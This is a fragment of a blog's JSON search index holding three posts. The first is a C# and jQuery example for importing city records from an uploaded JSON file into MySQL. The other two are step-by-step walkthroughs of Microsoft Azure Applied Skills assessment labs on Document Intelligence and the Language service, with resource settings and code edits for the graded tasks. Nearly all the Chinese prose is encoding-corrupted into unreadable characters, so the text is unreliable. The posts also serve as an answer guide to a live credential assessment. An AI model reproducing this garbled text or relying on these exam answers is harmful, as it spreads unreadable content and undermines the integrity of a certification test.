connection.Open(); foreach (var city in cityList) &#123; string query = &quot;INSERT INTO IMCityInfo (Pid, CityCode, CityName, PostCode, AreaCode, Ctime, CtimeInt, LangType) VALUES (@Pid, @CityCode, @CityName, @PostCode, @AreaCode, @Ctime, @CtimeInt, @LangType)&quot;; using (MySqlCommand command = new MySqlCommand(query, connection)) &#123; command.Parameters.AddWithValue(&quot;@Pid&quot;, city.Pid); command.Parameters.AddWithValue(&quot;@CityCode&quot;, city.CityCode); command.Parameters.AddWithValue(&quot;@CityName&quot;, city.CityName); command.Parameters.AddWithValue(&quot;@PostCode&quot;, city.PostCode); command.Parameters.AddWithValue(&quot;@AreaCode&quot;, city.AreaCode); command.Parameters.AddWithValue(&quot;@Ctime&quot;, city.Ctime); command.Parameters.AddWithValue(&quot;@CtimeInt&quot;, city.CtimeInt); command.Parameters.AddWithValue(&quot;@LangType&quot;, city.LangType); command.ExecuteNonQuery(); &#125; &#125; &#125; &#125; return Json(new &#123; success = true, message = &quot;Data imported successfully.&quot; &#125;); &#125; catch (Exception ex) &#123; return Json(new &#123; success = false, message = ex.Message &#125;); &#125; &#125; å‰ç«¯ä¸Šä¼ JSON 12345678&lt;form id=&quot;uploadForm&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;jsonFile&quot; accept=&quot;.json&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Upload JSON File&lt;/button&gt; &lt;/form&gt; &lt;div id=&quot;response&quot;&gt;&lt;/div&gt; &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt; 1234567891011121314151617181920212223242526272829$(document).ready(function () &#123; $(&#x27;#uploadForm&#x27;).on(&#x27;submit&#x27;, function (event) &#123; event.preventDefault(); // Prevent the default form submission var formData = new FormData(); var fileInput = $(&#x27;#jsonFile&#x27;)[0]; if (fileInput.files.length &gt; 0) &#123; var file = fileInput.files[0]; formData.append(&#x27;file&#x27;, file); $.ajax(&#123; url: &#x27;/ImportCities&#x27;, // Adjust this URL to match your API endpoint type: &#x27;POST&#x27;, data: formData, processData: false, // Important! contentType: false, // Important! success: function (response) &#123; $(&#x27;#response&#x27;).text(&#x27;Success: &#x27; + response.message); &#125;, error: function (error) &#123; $(&#x27;#response&#x27;).text(&#x27;Error: &#x27; + error.responseJSON.error); &#125; &#125;); &#125; else &#123; $(&#x27;#response&#x27;).text(&#x27;Please select a file.&#x27;); &#125; &#125;);&#125;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"},{"name":"JSON","slug":"JSON","permalink":"https://banjinmei.github.io/tags/JSON/"}],"author":"mu"},{"title":"Azure AI Document Intelligence","slug":"Azure-AI-Document-Intelligence","date":"2024-06-07T15:06:10.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/06/07/Azure-AI-Document-Intelligence/","permalink":"https://banjinmei.github.io/2024/06/07/Azure-AI-Document-Intelligence/","excerpt":"","text":"åˆ›å»ºæ™ºèƒ½æ–‡æ¡£å¤„ç†è§£å†³æ–¹æ¡ˆåœ¨ç¬¬äºŒçº§ä¸­ï¼Œè¿™3ä¸ªæ¨¡å—ï¼Œæ¯ä¸€ä¸ªä¸­éƒ½æœ‰ä¸åŒçš„ä»»åŠ¡æ“ä½œï¼Œè¿™äº›æ“ä½œåŒ…æ‹¬ä½¿ç”¨ Azure è¿›è¡Œå®é™…åˆ›å»ºæœåŠ¡æ“ä½œæˆ–è€…ä½¿ç”¨ä»£ç è°ƒç”¨ Azureçš„æœåŠ¡ï¼Œè¿™äº›ä»£ç å¯ä»¥ä½¿ç”¨pythonæˆ–è€…C#ï¼Œè¿™äº›è¿›è¡Œé€‰æ‹©ã€‚æ‰€æœ‰çš„æ¨¡å—å†…çš„è€ƒè¯•æ˜¯é€šè¿‡ä¸€ä¸ªé‚®ä»¶çš„æ–¹å¼è¿›è¡Œå‘ŠçŸ¥ã€‚ https://learn.microsoft.com/en-us/credentials/applied-skills/create-intelligent-document-solution-azure-ai/#applied-skill-take-the-assessment start ç™»é™†å®éªŒç¯å¢ƒ åŠ è½½æˆåŠŸåä¼šå‡ºç°è™šæ‹Ÿæœºå™¨ç™»é™†ç•Œé¢ï¼Œæ‰¾åˆ°å³ä¾§çš„ Step1 ä¸­çš„ç”¨æˆ·åå¯†ç ã€‚ç™»é™†è·å–å®éªŒè´¦å·å¹¶ç™»é™† Azureè¿›å…¥åˆ°æœºå™¨åï¼Œç‚¹å‡»æ¡Œé¢çš„ Email å›¾ç‰‡ï¼Œæ‰“å¼€æˆ‘ä»¬çš„å®éªŒç›®æ ‡ã€‚ æ‰“å¼€æ¡Œé¢çš„ email åï¼Œä¼šå‡ºç°å¦‚ä¸‹çš„ç•Œé¢ã€‚è¿™é‡Œä¸»è¦å…³æ³¨ä¸¤ç‚¹ï¼š ä¸€ä¸ªæ˜¯å·¦ä¾§è“è‰²çš„éƒ¨åˆ†ï¼šInboxï¼Œè¿™é‡ŒåŒ…æ‹¬ç¯å¢ƒä¿¡æ¯ä»¥åŠå®éªŒç›®æ ‡è€ƒé¢˜ã€‚å¦ä¸€ä¸ªæ˜¯æµè§ˆå™¨çš„é¡µç­¾ä¸­çš„ç¬¬äºŒä¸ªï¼Œä¹Ÿå°±æ˜¯ç™»é™† Azure çš„ç¯å¢ƒç½‘å€ ç‚¹å‡»ä¸Šå›¾çš„ Azure æ ‡ç­¾é¡µï¼Œè¿›å…¥ç™»é™†é¡µé¢ï¼Œç”¨emailæä¾›çš„è´¦å·å¯†ç ç™»é™† è¯•éªŒä¸€ï¼š Create a prototypeç‚¹å‡»é‚®ä»¶ä¸­çš„ Create a prototype èœå•ä¼šå‡ºç°å…·ä½“çš„å†…å®¹è¦æ±‚ã€‚ åœ¨ç¬¬ä¸€ä¸ªå®éªŒä¸­ä¸»è¦æ˜¯ä½¿ç”¨å¾®è½¯çš„åªèƒ½å­˜å‚¨æœåŠ¡ï¼Œå¹¶ä¸”åˆ›å»ºçš„æ—¶å€™è¦ç¬¦åˆè¦æ±‚ï¼Œè¿™ä¸ªæœåŠ¡è¦æ»¡è¶³çš„è¦æ±‚æ˜¯è¦ä¿å­˜æ‰€ç»™çš„æ–‡ä»¶æˆJsonæ–‡ä»¶ï¼Œä¹‹ååœ¨ä¿å­˜åˆ° Azure çš„å­˜å‚¨æœåŠ¡ä¸­ã€‚ å®éªŒæµç¨‹æ“ä½œé¦–å…ˆåˆ° Azure ä¸­ï¼Œæœç´¢æ‰€ç»™å‡ºçš„èµ„æºç»„ï¼Œé€‰æ‹© RG1å¼€å¤´çš„èµ„æºç»„ è¿›å…¥åˆ°èµ„æºç»„åï¼Œç‚¹å‡»åˆ›å»ºæŒ‰é’®ã€‚åœ¨æœç´¢æ¡†ä¸­è¾“å…¥document intelligence ç‚¹å‡»é€‰æ‹©ã€‚ ç‚¹å‡» æ–‡æ¡£æ™ºèƒ½æœåŠ¡ è¿›å…¥åˆ°æœåŠ¡åï¼Œç‚¹å‡»è“è‰²çš„åˆ›å»ºæŒ‰é’®ã€‚ åœ¨è¿™é‡Œç›´æ¥é€‰æ‹©é»˜è®¤çš„è®¢é˜…ä»¥åŠèµ„æºç»„ï¼ŒRegion ç›®å‰å»ºè®®é€‰æ‹© Japan Eastï¼ˆå¦‚æœåé¢çš„æ­¥éª¤ï¼Œåœ¨è¿è¡Œåˆ†ææ–‡æ¡£æ—¶ï¼Œé‡åˆ°æƒé™ä¸è¶³é—®é¢˜ï¼Œè¯·åœ¨æ­¤æ­¥éª¤é€‰æ‹©å…¶ä»– Region ï¼‰ åœ¨è¿™é‡Œåå­—å¡«å…¥ï¼šfrom-document-xxxï¼Œå¦‚ï¼ˆfrom-document-01ï¼‰ä»·æ ¼å±‚è¦é€‰æ‹©å…è´¹å±‚ï¼Œä¹Ÿå°±æ˜¯ä¸‹å›¾ä¸­çš„ Free F0ï¼Œä¹‹åç‚¹å‡»é¢„è§ˆåˆ›å»ºæŒ‰é’®ã€‚ é¢„è§ˆæ²¡æœ‰é—®é¢˜åï¼Œç›´æ¥ç‚¹å‡»åˆ›å»ºæŒ‰é’®ã€‚åˆ›å»ºå®Œæ¯•åï¼Œåœ¨é¡µé¢ä¸­ç‚¹å‡» Go to resource æŒ‰é’® ä¹‹åç‚¹å‡» Go to Document Intelligence Studio æŒ‰é’® è¿›å…¥åˆ°æœåŠ¡é¡µé¢åï¼Œä¸‹æ»‘é¡µé¢ï¼Œç‚¹å‡» Invoices çš„ Try it outã€‚ ï¼ˆå¦‚æœå¼¹å‡ºé€‰æ‹©è´¦æˆ·çš„å¼¹æ¡†ï¼Œç‚¹å‡»ä¸€ä¸ªå°±å¥½ï¼‰ åœ¨æœåŠ¡çš„å¡«å†™è¡¨æ ¼é¡µé¢ï¼Œé»˜è®¤çš„è®¢é˜…å’Œèµ„æºç»„é€‰æ‹©ä¸‹æ‹‰æŒ‰é’® é¢„è§ˆåç‚¹å‡»å®ŒæˆæŒ‰é’®ã€‚ åœ¨ä¸Šè¿°æ­¥éª¤å®Œæˆåï¼Œç‚¹å‡»å·¦ä¾§çš„ä¸Šä¼ åŒºåŸŸï¼Œç‚¹å‡»é€‰æ‹©æ–‡ä»¶æŒ‰é’®ï¼Œåœ¨æ–°å¼¹å‡ºçš„é€‰æ‹©æ–‡ä»¶ç­ï¼Œæ‰¾åˆ° C:\\Filesçš„æ–‡ä»¶ï¼Œä¹‹åé€‰æ‹©å‘ç¥¨pdf é€‰æ‹©ç©æ–‡ä»¶åï¼Œç‚¹å‡» Analyze options é€‰é¡¹ï¼Œä¹‹åé€‰æ‹© all documentsï¼Œä¹‹åç‚¹å‡»ä¿å­˜æŒ‰é’®ã€‚ é…ç½®å®Œåˆ†æé€‰é¡¹åï¼Œç‚¹å‡»ç›´æ¥ç‚¹å‡»è¿è¡Œåˆ†ææŒ‰é’®ã€‚ è¿è¡Œå®Œåï¼Œæ‰¾åˆ°å³ä¾§çš„ ResultæŒ‰é’®ï¼Œä¹‹åä¸‹è½½ä¸‹æ¥æˆ‘ä»¬æ‰€éœ€è¦çš„ JSON æ–‡ä»¶ã€‚ åˆšä¸Šä¼ çš„ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†æå®Œä¸‰ä¸ªéƒ½ä¸‹è½½ä¸‹æ¥ã€‚ ä¹‹åæˆ‘ä»¬é‡å¤æ“ä½œï¼Œå°†æ‰€æœ‰çš„å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ ã€‚ åŒæ ·çš„ç‚¹å‡»åˆ†ææŒ‰é’®ã€‚ä¸‹è½½ä¸‹æ¥ç»“æœJSONæ–‡ä»¶ã€‚ æœ€åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹è½½çš„ç»“æœæ–‡ä»¶å¦‚ä¸‹å›¾è¿™å‡ ä¸ªåœ¨ Downloads æ–‡ä»¶å¤¹ä¸­ï¼ˆåœ¨åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å¤åˆ¶è¿™äº›æ–‡ä»¶ å¤åˆ¶ä¸Šè¿°çš„æ–‡ä»¶åç²˜è´´åœ¨ä¸‹å›¾è·¯å¾„çš„æ–‡ä»¶å¤¹ä¸­ã€‚ c:&#x2F;files æ¥ç€æˆ‘ä»¬è¿”å› RG1 çš„è¿™ä¸ªèµ„æºç»„ï¼ˆè¿›å…¥æ­¥éª¤åœ¨æœ¬ç¯‡æ–‡æ¡£å¼€å¤´çš„ä½ç½®â€¦â€¦ï¼‰ï¼Œé€‰æ‹© prototype å¼€å¤´çš„èµ„æºï¼Œç‚¹å‡»è¿›å…¥ ä¹‹åæˆ‘ä»¬å±•å¼€ Data storage è¿›å…¥åˆ°å­˜å‚¨æœåŠ¡ä¸­é€‰æ‹© Containers ä¹‹åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ Containerï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨åå­—ï¼šcon-invoicesã€‚ åŒæ ·æ“ä½œå†æ¬¡åˆ›å»ºå¦ä¸€ä¸ª Containersï¼Œåå­—å«åšï¼šcon-receiptsã€‚ å¯ä»¥çœ‹åˆ°æˆ‘è¿™é‡Œåˆ›å»ºäº†ä¸¤ä¸ª Containersï¼Œä¸€ä¸ªå­˜pdfçš„ä¸€ä¸ªå­˜å›¾ç‰‡çš„ åˆ†åˆ«ç‚¹å‡»ä¸¤ä¸ªåå­—ï¼Œä¹‹åæˆ‘ä»¬å¼€å§‹ä¸Šä¼  æŠŠæ‰€æœ‰çš„ Invoice ç›¸å…³æ–‡ä»¶ä¸Šä¼  å¦å¤–ä¸€ä¸ªå°†æ‰€æœ‰çš„ receipt æ–‡ä»¶ä¸Šä¼ ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªä»»åŠ¡å°±å®Œæˆäº†ã€‚ è¯•éªŒäºŒï¼šTrain a custom modelåœ¨å®éªŒäºŒä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªæ™ºèƒ½æ–‡æ¡£åˆ†ææœåŠ¡ï¼Œå¹¶ä¸”è¿›è¡Œç›¸å…³çš„è®­ç»ƒã€‚é¦–å…ˆæˆ‘ä»¬è¿›å…¥ https://documentintelligence.ai.azure.com/studio é¡µé¢é€‰æ‹©æœåŠ¡ï¼šCustom extraction modelã€‚ ä¸‹æ‹‰é¡µé¢ï¼Œä¹‹åç‚¹å‡»é¡¹ç›®é€‰é¡¹ä¸­çš„ åˆ›å»ºä¸€ä¸ªé¡¹ç›®æŒ‰é’®ï¼Œåœ¨æ–°é¡µé¢ï¼Œè¾“å…¥é¡¹ç›®åç‚¹å‡»ç»§ç»­æŒ‰é’®ã€‚ åœ¨è¯¦ç»†é¡µé¢ï¼Œè®¢é˜…ä»¥åŠèµ„æºç»„é€‰é¡¹é€‰æ‹©é»˜è®¤ï¼Œæ™ºèƒ½æ–‡æ¡£åå­—è¦é€‰æ‹©æˆ‘ä»¬çš„é¢˜ç›®è¦æ±‚formå¼€å¤´çš„ï¼Œ APIé€‰æ‹©ï¼š2022-08-31 è¿™é‡Œæ³¨æ„é™¤äº†è®¢é˜…å’Œèµ„æºç»„é€‰é¡¹é»˜è®¤å¤–ï¼Œæˆ‘ä»¬çš„å­˜å‚¨è´¦å·è¦é€‰æ‹©qualityå¼€å¤´çš„è¿™ä¸ªï¼Œè¿™é‡Œä¸è¦é€‰é”™ã€‚ ä¸Šè¿°å®Œæˆåç‚¹å‡»é¢„è§ˆåˆ›å»ºæŒ‰é’®ã€‚ ç­‰å¾…ä¸€ä¼šåï¼Œåœ¨å¼¹å‡ºçš„é¡µé¢ç›´æ¥ç‚¹å‡» Run now æŒ‰é’® å¦‚æœå‡ºç° failed to fetch åˆ·æ–°ä¸€ä¸‹å½“å‰çš„é¡µé¢ åœ¨æ–°é¡µé¢ä¸­ï¼Œé€‰æ‹©ä¸€ä¸ªjpgæ–‡ä»¶åï¼Œç‚¹å‡»å³ä¾§çš„æ·»åŠ å­—æ®µé€‰é¡¹ è¿™é‡Œæ ¹æ®æˆ‘ä»¬çš„é¢˜ç›®ï¼Œéœ€è¦æ·»åŠ å¦‚ä¸‹çš„å‡ ä¸ªå­—æ®µEmailé‡Œï¼ˆç¬¬ä¸€åˆ—æ˜¯å­—æ®µï¼Œç¬¬äºŒåˆ—æ˜¯å¯¹åº”çš„ç±»å‹ï¼‰ å¯ä»¥çœ‹åˆ°æˆ‘åœ¨å³ä¾§å·²ç»æ ¹æ®é¢˜ç›®åˆ›å»ºäº†è¿™5ä¸ªå­—æ®µ è¿™é‡Œæ˜¯ä»‹ç»å¦‚ä½•è¿›è¡Œé€‰æ‹©å­—æ®µçš„æ•°æ®ç±»å‹*ï¼Œæ¯”å¦‚Numberå­—æ®µï¼Œè¦é€‰æ‹© integer ç±»å‹ã€‚ä¾æ¬¡æŠŠäº”ä¸ªæ ‡ç­¾åéƒ½è®¾ç½®å¥½æ•°æ®ç±»å‹ã€‚ ä¹‹åæˆ‘ä»¬ç‚¹å‡»å›¾ç‰‡çš„ Numberæ•°å­—ï¼Œä¹Ÿå°±æ˜¯ä¸‹å›¾çš„ç»¿è‰²éƒ¨åˆ†çš„æ•°å­—ï¼Œä¹‹åç‚¹é¼ æ ‡å·¦é”®ï¼Œé€‰æ‹©æˆ‘ä»¬åˆšæ‰åˆ›å»ºçš„ Number å­—æ®µ åŒæ ·çš„æˆ‘ä»¬æŠŠæ‰€æœ‰çš„å­—æ®µéƒ½åœ¨å›¾ç‰‡ä¸­é€‰æ‹©æ‰“ä¸Šæ ‡ç­¾ é‡å¤æ“ä½œæ‰€æœ‰çš„å›¾ç‰‡æ–‡ä»¶ï¼Œå°†å­—æ®µæ ‡è®°æ¸…æ¥šï¼Œä¹‹åç‚¹å‡»è®­ç»ƒæŒ‰é’®. è¿™é‡Œé€‰æ‹©è®­ç»ƒæ¨¡å‹ï¼Œç›´æ¥å†™ä¸Š QA-Templateï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚Build Mode é€‰æ‹© Template ç‚¹å‡» Go to Models å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™é‡Œå·²ç»åˆ›å»ºäº†è®­ç»ƒï¼Œç‚¹å‡»QA-Template æˆ‘ä»¬è¿›è¡Œæµ‹è¯•ï¼Œç›´æ¥ç‚¹å‡» Test æŒ‰é’®ã€‚ é€‰æ‹©ç”µè„‘ä¸­çš„ Cç›˜ä¸‹ QA_Test æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ã€‚ ç‚¹å‡»è¿è¡Œåˆ†ææŒ‰é’® åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œæ‰€æœ‰çš„éƒ½åˆ†æå®Œåï¼Œæˆ‘ä»¬è¦ä¸‹è½½ report0008.jpgçš„ç»“æœï¼Œè®²è¿™ä¸ª JSONæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ ç»“æœä¿å­˜ä¸‹æ¥ã€‚å­˜åˆ°QA_Testæ‰“å¼€VSCode &gt;&gt; ç‚¹å‡» Open Folder æŒ‰é’®ã€‚æ¥ä¸‹æ¥æ‰“å¼€ C ç›˜ä¸‹çš„ App1 æ–‡ä»¶å¤¹ ä¹‹åæ‰“å¼€Python æ–‡ä»¶å¤¹ä¸‹ App1.py æ–‡ä»¶ã€‚æ›´æ”¹çš„ä»£ç ï¼š ï¼ˆï¼ï¼ï¼æ ¼å¼ç¼©è¿›è¦ï¼ï¼ï¼æ³¨ï¼ï¼ï¼æ„ï¼ï¼ï¼ï¼‰ 12345678#9task = form_recognizer_client.begin_recognize_invoices(form_data)#21if field.confidence &gt;= 0.70: invoice_total += field.value#37folder_path = r&quot;C:\\App1\\Invoices&quot; ä¹‹ååœ¨ python ç›®å½•ä¸‹çš„.envæ–‡ä»¶å†…ï¼Œæ·»åŠ è‡ªå·±çš„åˆ›å»ºæœåŠ¡çš„ endpoint å’Œ key å€¼ã€‚ctrl S ä¿å­˜æ–‡ä»¶ psï¼šKey å’Œ endpoint è¿›å…¥https://portal.azure.com/ ï¼Œé€‰æ‹©åˆšåˆšåˆ›å»ºçš„èµ„æº é¡µé¢åˆ‡å› App1.py è¿™ä¸ªæ–‡ä»¶ ç›´æ¥ç‚¹å‡»å³ä¸Šè§’ä¸‰è§’è¿è¡Œ è¿è¡Œçœ‹ç»“æœï¼Œå·²ç»åˆ†æå‡ºæ¥äº† æœ€åå®éªŒå®Œæˆï¼Œç‚¹å‡»æäº¤å®éªŒç­‰å¾…ç»“æœå³å¯ã€‚ End","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"AzureAI","slug":"AzureAI","permalink":"https://banjinmei.github.io/tags/AzureAI/"}],"author":"mu"},{"title":"Azure OpenAI Build Natural Language","slug":"Azure-OpenAI-Build-Natural-Language","date":"2024-06-06T17:03:12.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/06/07/Azure-OpenAI-Build-Natural-Language/","permalink":"https://banjinmei.github.io/2024/06/07/Azure-OpenAI-Build-Natural-Language/","excerpt":"","text":"https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment?ocid=reactor start è¿›å…¥ç¯å¢ƒä¸­ï¼Œç‚¹å‡»Step 1ï¼Œç„¶åç‚¹å‡»Passwordå³è¾¹çš„Tï¼Œç™»å½•ç¯å¢ƒ åŒå‡»æ‰“å¼€æ¡Œé¢çš„Emailæ–‡ä»¶å¯¹Inboxçš„å†…å®¹è¿›è¡Œé€ä¸ªç‚¹å‡»ï¼Œå…¶ä¸­Existing EnvironmentåŒ…å«äº†å¾®è½¯å®˜æ–¹æä¾›çš„Azureçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œproof of conceptã€Invoice validationã€chatbot backend åˆ†åˆ«è¡¨ç¤ºçš„æ˜¯æœ¬æ¬¡è€ƒè¯•çš„ä¸‰å¤§ä»»åŠ¡çš„å…·ä½“è¦æ±‚å°†é‚®ç®±ä¸­Existing Environmentçš„ç”¨æˆ·åå’Œå¯†ç ä¾æ¬¡å¤åˆ¶åˆ°Azureçš„æ ‡ç­¾é¡µé¢ä¸­ï¼Œå¹¶ç‚¹å‡»Sign inå®ŒæˆAzureçš„ç™»å½• è¯•éªŒä¸€ï¼š Proof of Concept (POC)ç‚¹å‡»é‚®ä»¶ä¸­çš„ Proof of Concept (POC) èœå•ä¼šå‡ºç°å…·ä½“çš„å†…å®¹è¦æ±‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ åœ¨ç¬¬ä¸€ä¸ªå®éªŒä¸­ä¸»è¦æ˜¯ä½¿ç”¨å¾®è½¯çš„ language æœåŠ¡ï¼Œå¹¶ä¸”åˆ›å»ºçš„æ—¶å€™è¦ç¬¦åˆè¦æ±‚ï¼Œè¿™ä¸ªæœåŠ¡è¦æ»¡è¶³å®¢æˆ·è‡ªå®šä¹‰æ–‡æœ¬æ ‡å‡†å’Œ NERã€‚åœ¨å®éªŒä¸­å¦å¤–ä¸€ä¸ªè¦æ±‚æ˜¯éœ€è¦ä½¿ç”¨ä»£ç æœ€åè°ƒç”¨è¿™ä¸ªä½ åˆ›å»ºæœåŠ¡ã€‚æµç¨‹æ“ä½œé¦–å…ˆåœ¨ç™»å½•ä¸»é¡µé¢æœç´¢æ  æœç´¢RG1ï¼Œå¹¶ç‚¹å‡»Resource Groupsä¸‹é¢çš„RG1è¿›å…¥åç‚¹å‡» Create æŒ‰é’® ä¹‹ååœ¨é¦–é¡µå†…æœç´¢language service ç‚¹å‡»è¿›å…¥åˆ° Language service åï¼Œç‚¹å‡» Createä¹‹åç‚¹å‡»å³ä¸‹æ–¹çš„ç¬¬äºŒä¸ª select æŒ‰é’®é€‰æ‹©å¥½ä¹‹åï¼Œç‚¹å‡»ä¸‹æ–¹çš„æŒ‰é’® continue to create your resource åœ¨é…ç½®é¡µé¢ï¼ŒæŒ‰ç…§æˆ‘ä»¬çš„é¢˜ç›®è¦æ±‚ï¼Œåœ¨ Region ä¸­é€‰æ‹© North Europeï¼Œå…¶ä¸­ Name ä»é‚®ä»¶ä¸­æ‰¾ï¼Œåœ¨ Proof of concept è¿™é‡Œ langå¼€å¤´çš„è¿™ä¸ªåå­—ï¼Œä½œä¸ºåˆšæ‰åˆ›å»ºèµ„æºçš„ Name å€¼ ä¸»è¦éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ Pricing tierå±‚é‡Œï¼Œéœ€è¦é€‰æ‹© Free F0 çš„è¿™ä¸ªï¼Œè¿™ä¸€ç‚¹ä¹Ÿæ˜¯é¢˜ç›®è¦æ±‚çš„ã€‚ä¸‹é¢é€‰æ‹© Existing storege account ï¼Œåœ¨å­˜å‚¨è´¦æˆ·è¿™é‡Œï¼Œéœ€è¦é€‰æ‹©é¢˜ç›®è¦æ±‚çš„ä»¥saå¼€å¤´çš„è¿™ä¸ªè´¦æˆ·ã€‚ è¿™äº›é…ç½®éƒ½æ²¡é—®é¢˜åï¼Œç›´æ¥ç‚¹å‡»è“è‰²çš„ Review + create æŒ‰é’®ã€‚è¿›å…¥åˆ°å®¡æ ¸é¡µé¢ï¼Œè¿™ä¸ªé¡µé¢æ²¡æœ‰é—®é¢˜åï¼Œç‚¹å‡»è“è‰²çš„ Create æŒ‰é’®ã€‚ ç­‰å¾…è‹¥å¹²åˆ†é’Ÿï¼Œå‡ºç°å¦‚ä¸‹ç”»é¢è¡¨ç¤ºæœåŠ¡åˆ›å»ºå®Œæˆï¼Œç‚¹å‡» Go to resource groupç‚¹å‡» è¿›å…¥ lang å¼€å¤´çš„è¿™ä¸ªæœåŠ¡ åœ¨åˆ›å»ºå®ŒæˆæœåŠ¡åï¼Œè¿›å…¥åˆ°æœåŠ¡é¡µé¢ï¼Œæ‰¾åˆ°ä¸‹é¢å¦‚å›¾æ‰€ç¤ºçš„é“¾æ¥: Click here to manage keys è¿™é‡Œé¢æœ‰æ‰€éœ€è¦çš„ keyå’Œ endpoint ç­‰ã€‚ åœ¨è¿™ä¸ªé¡µé¢å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ¯”è¾ƒä¸œè¥¿æ˜¯æˆ‘ä»¬åœ¨ä»£ç ä¸­éœ€è¦çš„ï¼Œä¸€ä¸ªæ˜¯ key ä¸€ä¸ªæ˜¯ endpointã€‚åœ¨åé¢æˆ‘ä»¬è¯•éªŒä¸€å’Œè¯•éªŒä¸‰è¦ç”¨åˆ°ã€‚ æ‰“å¼€ç”µè„‘ C:\\PoC\\Csharpæ–‡ä»¶å¤¹ä¸‹çš„ program.cs å°†æˆ‘ä»¬çš„ key å’Œ endpoint æ›¿æ¢ä¸ºæˆ‘ä»¬ä¸Šä¸€æ­¥éª¤ä¸­çš„å€¼ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839using Azure;using System;using Azure.AI.TextAnalytics;namespace ProofOfConcept&#123; class Program &#123; private static readonly AzureKeyCredential credentials = new AzureKeyCredential(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); private static readonly Uri endpoint = new Uri(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); static void RecognizeYourText(TextAnalyticsClient client) &#123; string document = &quot;Call our office at 312-555-1234 and ask for Graham Barnes, or send an email to support@contoso.com.&quot;; var entities = client.null; // replace null with the correct method to recognize the requested information.a Console.WriteLine($ &quot;Redacted Text: &#123;entities.RedactedText&#125;&quot;); if(entities.Count &gt; 0) &#123; Console.WriteLine($ &quot;Recognized &#123;entities.Count&#125; the following entities &#123;(entities.Count &gt; 1 ? &quot; ies &quot; : &quot; y &quot;)&#125;:&quot;); foreach(var entity in entities) &#123; Console.WriteLine($ &quot;Text: &#123;entity.Text&#125;, Category: &#123;entity.Category&#125;, SubCategory: &#123;entity.SubCategory&#125;, Confidence score: &#123;entity.ConfidenceScore&#125;&quot;); &#125; &#125; else &#123; Console.WriteLine(&quot;No entities were found.&quot;); &#125; &#125; static void Main(string[] args) &#123; var client = new TextAnalyticsClient(endpoint, credentials); RecognizeYourText(client); Console.Write(&quot;Press any key to exit.&quot;); Console.ReadKey(); &#125; &#125;&#125; è¿›å…¥åˆ°cmdä¸­åï¼Œbuild run ~ ok Or ç”¨python æ‰“å¼€ç”µè„‘ C:\\PoC\\Python æ–‡ä»¶å¤¹ä¸‹çš„ App1.py key å’Œ endpoint æ›¿æ¢ 1234567891011121314151617181920212223242526272829303132from azure.ai.textanalytics import TextAnalyticsClientfrom azure.core.credentials import AzureKeyCredential# Authenticate the client using your key and endpoint text_analytics_credential = AzureKeyCredential(key)text_analytics_client = TextAnalyticsClient( endpoint=endpoint, credential=text_analytics_credential)# Method for recognizing content in documents def recognize_your_text(client): documents = [ &quot;Call our office at 312-555-1234 and ask for Graham Barnes, or send an email to support@contoso.com.&quot; ] # Replace null with the correct method to recognize the requested information. response = client.recognize_entities(documents, language=&quot;en&quot;) result = [doc for doc in response if not doc.is_error] for doc in result: #print(&quot;Redacted Text: &#123;&#125;&quot;.format(doc.redacted_text)) for entity in doc.entities: print(&quot;Entity: &#123;&#125;&quot;.format(entity.text)) print(&quot;\\tCategory: &#123;&#125;&quot;.format(entity.category)) print(&quot;\\tConfidence Score: &#123;&#125;&quot;.format(entity.confidence_score)) print(&quot;\\tOffset: &#123;&#125;&quot;.format(entity.offset)) print(&quot;\\tLength: &#123;&#125;&quot;.format(entity.length))recognize_your_text(text_analytics_client) ç›®å½•çš„åœ°å€æ ï¼Œè¾“å…¥cmdæŒ‰ä¸‹å›è½¦ 1python App1.py ok è¯•éªŒäºŒï¼šInvoice validationåœ¨ç¬¬äºŒä¸ªå®éªŒä¸­ä¸»è¦ä½¿ç”¨äº† NER å»æŠ½å–æŒ‡å®šå†…å®¹ã€‚è¿™éœ€è¦åœ¨ Azure çš„è¯­è¨€æœåŠ¡ä¸­å»éƒ¨ç½²ä¸€ä¸ª Language studio æœåŠ¡ã€‚ 